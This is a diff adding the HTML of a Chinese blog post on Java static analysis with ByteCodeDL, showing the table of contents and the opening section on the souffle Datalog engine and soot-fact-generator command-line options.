@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="静态分析实战 之 ByteCodeDL 篇写在前面看了那么多篇 paper ，最终还是要回归到代码上，从几个开源项目练手 Pre. 前置知识先来回顾一下 datalog 的静态分析模型吧：  https:&#x2F;&#x2F;racerz-fighting.github.io&#x2F;2023&#x2F;01&#x2F;04&#x2F;%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90&#x2F;#03-Data-Flow-Analysis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="静态分析实战 之 ByteCodeDL 篇">
+<meta property="og:url" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/index.html">
+<meta property="og:site_name" content="RacerZ">
+<meta property="og:description" content="静态分析实战 之 ByteCodeDL 篇写在前面看了那么多篇 paper ，最终还是要回归到代码上，从几个开源项目练手 Pre. 前置知识先来回顾一下 datalog 的静态分析模型吧：  https:&#x2F;&#x2F;racerz-fighting.github.io&#x2F;2023&#x2F;01&#x2F;04&#x2F;%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90&#x2F;#03-Data-Flow-Analysis">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322111937687.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322113307697.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322114023242.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322173219187.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322174818988.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322144019118.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322144224355.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322145401439.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322151237105.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322163643039.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322192343203.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323152402675.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323201501213.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323210044499.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323210149158.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323211404548.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323212046104.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230325184335463.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230329150509271.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403224743686.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403231910409.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403232116193.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230403232627931.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230404152517388.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230404152657094.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405165306234.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405165319030.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405165330630.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405194355661.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405200852994.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406183422636.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406183910435.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406185244402.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406184948645.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406191931032.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406191857845.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406201535483.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230407192956829.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230407192759099.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230407195053988.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230408172007373.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405164825673.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230408172213115.png">
+<meta property="article:published_time" content="2023-04-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-08T13:29:07.793Z">
+<meta property="article:author" content="RacerZ">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="静态分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322111937687.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>静态分析实战 之 ByteCodeDL 篇</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2077/07/07/paper/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/04/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&text=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&is_video=false&description=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=静态分析实战 之 ByteCodeDL 篇&body=Check out this article: https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&name=静态分析实战 之 ByteCodeDL 篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&t=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E4%B9%8B-ByteCodeDL-%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">静态分析实战 之 ByteCodeDL 篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.0.1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pre-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.0.2.</span> <span class="toc-text">Pre. 前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0-%E5%86%85%E7%BD%AE%E8%B0%93%E8%AF%8D%E7%9A%84%E5%88%A9%E7%94%A8-%E2%80%94%E2%80%94-%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E6%9D%A1%E4%BB%B6%E7%9A%84%E7%B1%BB"><span class="toc-number">1.0.3.</span> <span class="toc-text">0. 内置谓词的利用 ——  查找特定条件的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%9E%E7%8E%B0-%E3%80%8CClass-Hierarchy%E3%80%8D"><span class="toc-number">1.0.4.</span> <span class="toc-text">1. 实现 「Class Hierarchy」</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-CHA-%E4%BC%98%E5%8C%96"><span class="toc-number">1.0.5.</span> <span class="toc-text">2. CHA 优化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CHA-%E5%BA%94%E7%94%A8"><span class="toc-number">1.0.6.</span> <span class="toc-text">3. CHA 应用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x1-buggyLoader-0ctf-2021-final"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">0x1. buggyLoader 0ctf-2021-final</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x2-ezchain-hf-ctf-2022"><span class="toc-number">1.0.6.2.</span> <span class="toc-text">0x2. ezchain hf-ctf-2022</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90"><span class="toc-number">1.0.7.</span> <span class="toc-text">4. 上下文无关指针分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-pta-ptaint-Analysis"><span class="toc-number">1.0.8.</span> <span class="toc-text">5. pta&#x2F;ptaint Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Demo-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.0.9.</span> <span class="toc-text">6. Demo 复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0-%E4%BD%BF%E7%94%A8ByteCodeDL%E5%88%86%E6%9E%90%E9%95%BF%E5%9F%8E%E6%9D%AFCTF-b4bycoffee"><span class="toc-number">1.0.10.</span> <span class="toc-text">7. [案例学习] 使用ByteCodeDL分析长城杯CTF b4bycoffee</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-GPT-4"><span class="toc-number">1.0.11.</span> <span class="toc-text">9. GPT-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.0.12.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        静态分析实战 之 ByteCodeDL 篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">RacerZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-07T16:00:00.000Z" itemprop="datePublished">2023-04-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>, <a class="tag-link-link" href="/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" rel="tag">静态分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="静态分析实战-之-ByteCodeDL-篇"><a href="#静态分析实战-之-ByteCodeDL-篇" class="headerlink" title="静态分析实战 之 ByteCodeDL 篇"></a>静态分析实战 之 ByteCodeDL 篇</h2><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>看了那么多篇 paper ，最终还是要回归到代码上，从几个开源项目练手</p>
+<h4 id="Pre-前置知识"><a href="#Pre-前置知识" class="headerlink" title="Pre. 前置知识"></a>Pre. 前置知识</h4><p>先来回顾一下 datalog 的静态分析模型吧：</p>
+<ul>
+<li><a href="https://racerz-fighting.github.io/2023/01/04/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/#03-Data-Flow-Analysis-I">https://racerz-fighting.github.io/2023/01/04/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/#03-Data-Flow-Analysis-I</a></li>
+<li><a target="_blank" rel="noopener" href="https://ranger-nju.gitbook.io/static-program-analysis-book/ch4/04-02-datalog-based-pa">https://ranger-nju.gitbook.io/static-program-analysis-book/ch4/04-02-datalog-based-pa</a></li>
+</ul>
+<p>souffle 引擎的入门以及规则参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyOTkwNTQ5Mg==&amp;mid=2247487087&amp;idx=1&amp;sn=4ce42ac78f232a7d3fce13d6ed06c44e&amp;chksm=fa58ac54cd2f254205e557f4cc9f5857d2a384bc89a36b15bf87212d50f52c2d51a8cef3c34f&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzUyOTkwNTQ5Mg==&amp;mid=2247487087&amp;idx=1&amp;sn=4ce42ac78f232a7d3fce13d6ed06c44e&amp;chksm=fa58ac54cd2f254205e557f4cc9f5857d2a384bc89a36b15bf87212d50f52c2d51a8cef3c34f&amp;scene=21#wechat_redirect</a></li>
+<li><a target="_blank" rel="noopener" href="https://y4er.com/posts/bytecodedl/#%E7%8E%AF%E5%A2%83">https://y4er.com/posts/bytecodedl/#%E7%8E%AF%E5%A2%83</a></li>
+</ul>
+<p>ByteCodeQL 规则和语法参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/BytecodeDL/ByteCodeDL/tree/main/docs">https://github.com/BytecodeDL/ByteCodeDL/tree/main/docs</a></li>
+</ul>
+<p>简单来说，souffle 的作用就是根据已有的 facts (EDB) 和预设值的规则 (dl文件) 遍历产生新的 facts </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. example.dl</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>其中， <code>-F</code> 指定了facts所在的目录，而 <code>-D</code> 制定了输出目录， <code>example.dl</code> 为datalog文件</p>
+</blockquote>
+<p>因此我们还需要辅助生成 facts 的工具：<code>soot-fact-generator</code></p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322111937687.png" alt="image-20230322111937687" style="zoom:50%;"></p>
+<ul>
+<li><p><strong>常用命令：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 如果不使用--facts-subset，soot只会加载-i指定的class；使用了--facts-subset，则生成的fact就会根据--facts-subset的值来选择性生成</span><br><span class="line">java -Dfile.encoding=UTF-8 -Xmx32G -jar soot-fact-generator.jar -i classbean.jar -l ./rt.jar --full -d out_dir --allow-phantom --generate-jimple --facts-subset APP --ignore-wrong-staticness --debug</span><br><span class="line"></span><br><span class="line"># 如果想使用当前java环境下的rt.jar/jce.jar/jsse.jar，可以直接使用-lsystem选项代替-l ./rt.jar；</span><br><span class="line">--ssa就是生成SSA格式的IR，但是速度会很慢，并且很可能会因内存溢出而程序崩溃；</span><br><span class="line">java -Dfile.encoding=UTF-8 -Xmx32G -XX:-UseGCOverheadLimit -jar soot-fact-generator.jar -i classbean.jar -i classes.jar -lsystem --full -d out_dir --allow-phantom --generate-jimple --facts-subset APP --ignore-wrong-staticness --ssa --lowMem --debug</span><br><span class="line"></span><br><span class="line"># 禁用GC开销检查，如果使用--ssa选项，可以开启这个选项</span><br><span class="line">-XX:-UseGCOverheadLimit</span><br><span class="line"></span><br><span class="line">--application-regex 设置Class过滤规则，可以设置固定的ClassName，也可以设置ClassName全限定名的前缀、包前缀；例如：java.lang.String.class/java.lang.*/java.lang.St.**/**，如果设置了**，则代表所有ClassName都可以通过；</span><br><span class="line">-idir 批量添加指定目录下的jar文件，也就是批量指定-i选项；</span><br><span class="line"></span><br><span class="line">--facts-subset 共三个可选项：APP、APP_N_DEPS、PLATFORM，如果不指定，则soot只会加载-i指定的jar包中的class；APP选项soot会加载-i和-l指定的；APP_N_DEPS选项soot会加载-i、-l和-ld指定的；PLATFORM选项soot会加载-l指定的；但是最后soot生成的fact范围，是遵从选项的字面意思的；</span><br><span class="line"></span><br><span class="line">--also-resolve 这个选项也很重要，相当于soot.Scene#addBasicClass(extraClass, SootClass.BODIES),如果有一些class无法被soot分析，可以把他加入到基本类中；</span><br><span class="line"></span><br><span class="line">--allow-phantom 是否支持Java中的幻象引用；</span><br><span class="line"></span><br><span class="line">--ignore-wrong-staticness 是否忽略fact创建过程中的 wrong static-ness 错误；</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>tips： <strong>soot-fact-generator在macos上运行时，如果 jar 包中存在 XML 文件可能会卡死，这应该是 rt.jar 中 XML 解析的 bug，暂未发现具体原因。</strong></p>
+</blockquote>
